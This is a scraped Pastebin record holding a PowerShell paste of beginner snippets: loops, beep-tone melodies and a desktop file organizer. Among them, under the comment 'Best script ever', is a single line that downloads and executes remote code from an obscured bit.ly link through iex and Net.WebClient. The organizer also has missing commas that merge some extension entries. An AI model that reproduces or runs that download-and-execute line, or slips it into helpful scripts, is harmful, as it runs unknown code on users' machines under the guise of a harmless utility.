{
    "scrape_url": "https://scrape.pastebin.com/api_scrape_item.php?i=pz1yC1iM",
    "full_url": "https://pastebin.com/pz1yC1iM",
    "date": "1594889194",
    "key": "pz1yC1iM",
    "size": 5957,
    "expire": "0",
    "title": "",
    "syntax": "powershell",
    "user": "",
    "filename": "pz1yC1iM",
    "pasteid": "pz1yC1iM",
    "pastesite": "pastebin.com",
    "@timestamp": "2020-07-16T08:46:34",
    "MD5": "03ee05654443de0aa0b5e70f3dcae5b9",
    "SHA256": "80953236468804fa093fd93d324d181afc7f97aa94570b65cce63d01b5b39338",
    "raw_paste": "<#Character spam, pyramidal form, CTRL+C to end it#>\r\n$i=\"*\"\r\nDo {\r\n$i=\"$i*\"\r\n$i\r\n}\r\nWhile ($true)\r\n\r\n<#Countdown, modify the number 10 to anything you want#>\r\n$i=1\r\nDo {\r\n$i\r\n$i++\r\n}\r\nWhile ($i -le 10)\r\n\r\n<#Countdown, but with a sleep timer#>\r\n$i=1\r\nDo {\r\n$i\r\nStart-Sleep -s 15\r\n$i++\r\n}\r\nWhile ($i -le 10)\r\n\r\n<#First Song:#>\r\n[console]::beep(440,500)\r\n[console]::beep(440,500)\r\n[console]::beep(440,500)\r\n[console]::beep(349,350)\r\n[console]::beep(523,150)\r\n[console]::beep(440,500)\r\n[console]::beep(349,350)\r\n[console]::beep(523,150)\r\n[console]::beep(440,1000)\r\n[console]::beep(659,500)\r\n[console]::beep(659,500)\r\n[console]::beep(659,500)\r\n[console]::beep(698,350)\r\n[console]::beep(523,150)\r\n[console]::beep(415,500)\r\n[console]::beep(349,350)\r\n[console]::beep(523,150)\r\n[console]::beep(440,1000)\r\n\r\n<#Second Song:#>\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(932,150)\r\nStart-Sleep -m 150\r\n[console]::beep(1047,150)\r\nStart-Sleep -m 150\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(699,150)\r\nStart-Sleep -m 150\r\n[console]::beep(740,150)\r\nStart-Sleep -m 150\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(932,150)\r\nStart-Sleep -m 150\r\n[console]::beep(1047,150)\r\nStart-Sleep -m 150\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(784,150)\r\nStart-Sleep -m 300\r\n[console]::beep(699,150)\r\nStart-Sleep -m 150\r\n[console]::beep(740,150)\r\nStart-Sleep -m 150\r\n[console]::beep(932,150)\r\n[console]::beep(784,150)\r\n[console]::beep(587,1200)\r\nStart-Sleep -m 75\r\n[console]::beep(932,150)\r\n[console]::beep(784,150)\r\n[console]::beep(554,1200)\r\nStart-Sleep -m 75\r\n[console]::beep(932,150)\r\n[console]::beep(784,150)\r\n[console]::beep(523,1200)\r\nStart-Sleep -m 150\r\n[console]::beep(466,150)\r\n[console]::beep(523,150)\r\n\r\n<#Best script ever#>\r\niex (New-Object Net.WebClient).DownloadString(\"http://bit.ly/e0Mw9w\")\r\n\r\n<#Useful organizing script#>\r\n$pathToUse = \"C:\\Utilisateurs\\$env:username\\Bureau\"\r\n$video = @(\r\n'3g2','3gp','3gpp','asf','avi','divx','f4v',\r\n'flv','h264','ifo','m2ts','m4v','mkv','mod','mov',\r\n'mp4','mpeg','mpg','mswmm','mts','mxf','ogv','rm',\r\n'srt','swf','ts','vep','vob','webm','wlmp','wmv'\r\n)\r\n$spreadsheets = @(\r\n'csv','ods','xls','xlsx'\r\n)\r\n$images = @(\r\n'arw','bmp','cr2','crw','dcm','dds','djvu','djvu',\r\n'dmg','dng','fpx','gif','ico','ithmb','jp2','jpeg',\r\n'jpg','nef','nrw','orf','pcd','pict','png','psd',\r\n'sfw','tga','tif','tiff','webp','xcf'\r\n)\r\n$presentations = @(\r\n'key','odp','pps','ppsx''ppt','pptm','pptx'\r\n)\r\n$docs = @(\r\n'chm','doc','docm','docx','dot','dotx','eml','eps',\r\n'hwp','log','m3u','odt','pages','pdf','pub','rtf',\r\n'sxw','txt','wpd',' wps','xml','xps'\r\n)\r\n$cadFiles = @(\r\n'dwg','dxf'\r\n)\r\n$misc = @(\r\n'bin','cda','dat','dll','exe','isc',\r\n'img','inf','ipa','kmz','lnk','pes',\r\n'ps','rem','torrent','ttf','vcf'\r\n)\r\n$ebooks = @(\r\n'azw','azw3','epub','fb2''lit','lrf','mbp','mobi',\r\n'opf','prc'\r\n)\r\n$web = @(\r\n'css','htm','html','js','json','php'\r\n)\r\n$arcs = @(\r\n'7z','apk','bz2','cbr','gz','gzip','jar','rar',\r\n'tar','tgz','zip','war'\r\n)\r\n$scripts = @(\r\n'bat','cmd','vb','vbs','vbe','js',\r\n'jse','ws','wsf','wsc','wsh','ps1',\r\n'ps1xml','ps2','ps2xml','psc1','psc2','sql'\r\n)\r\n$files = Get-ChildItem -Path $pathToUse\r\nForeach ($x in $files){\r\nif($docs.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Documents\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Documents\"\r\n}\r\nelseif($spreadsheets.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Spreadsheets\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Spreadsheets\"\r\n}\r\nelseif($images.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Images\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Images\"\r\n}\r\nelseif($presentations.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Presentations\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Presentations\"\r\n}\r\nelseif($video.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Videos\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Videos\"\r\n}\r\nelseif($cadFiles.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"CAD Files\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"CAD Files\"\r\n}\r\nelseif($misc.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Misc\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Misc\"\r\n}\r\nelseif($ebooks.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"E-Books\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"E-Books\"\r\n}\r\nelseif($web.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Web\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Web\"\r\n}\r\nelseif($arcs.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Archives\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Archives\"\r\n}\r\nelseif($scripts.Contains($x.Extension.TrimStart('.').ToLower())){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Scripts\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Scripts\"\r\n}\r\nelseif($x.Directory){\r\nNew-Item -ItemType Directory -Path $pathToUse -Name \"Other - misc\" -ErrorAction Ignore\r\nMove-Item -Path $x.FullName -Destination $pathToUse/\"Other - misc\"\r\n}\r\nelse{\r\nWrite-Host $x\r\n}\r\n}",
    "YaraRule": [
        "powershell"
    ]
}